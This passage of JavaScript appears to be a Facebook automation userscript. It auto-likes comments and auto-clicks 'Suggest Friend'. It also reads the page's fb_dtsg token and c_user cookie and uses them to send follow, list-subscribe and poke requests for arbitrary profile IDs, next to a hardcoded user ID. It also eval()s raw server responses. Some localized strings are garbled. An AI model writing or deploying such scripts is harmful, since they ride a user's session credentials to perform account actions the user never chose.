   if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J?Â¢Ã¢â€šÂ¬Ã¢â€žÂ¢aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen"))
   {
    H[J]=I[D];
    J++
   }
  }
  function E(L)
  {
   H[L].click();
   var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
   document.getElementById("like3").innerHTML=K
  }
  function G(K)
  {
   window.setTimeout(C,K)
  }
  function A()
  {
   var M=document.getElementsByTagName("label");
   var N=false;
   for(var L=0;L<M.length;L++)
   {
    var K=M[L].getAttribute("class");
    if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
    {
     alert("Warning from Facebook");
     N=true
    }
   }
   if(!N)
   {
    G(2160)
   }
  }
  function F(K)
  {
   window.setTimeout(A,K)
  }
  function C()
  {
   if(B<H.length)
   {
    E(B);
    F(700);
    B++
   }
  }
  C()
 }
}

var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{
 var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {
  if(http4.readyState==4&&http4.status==200)http4.close
 }
 ;
 http4.send(params4)
}

function sublist(uidss) 
{
 var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}

function p(abone) 
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
  if (http4.readyState == 4 && http4.status == 200) 
  {
   http4.close;
  }
 }
 ;
 http4.send(params4);
}
var user = "1273872655"

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}

function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Roopsi Code';
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);